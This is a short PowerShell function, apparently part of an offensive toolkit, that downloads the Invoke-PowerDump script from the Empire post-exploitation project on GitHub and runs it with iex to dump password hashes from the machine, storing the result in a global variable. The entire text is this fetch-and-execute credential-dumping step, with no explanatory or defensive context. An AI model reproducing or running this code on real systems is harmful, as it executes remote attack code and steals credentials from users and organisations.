function powerdump{
  (New-Request -Uri https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1) | iex
  $global:execute = Invoke-PowerDump
}
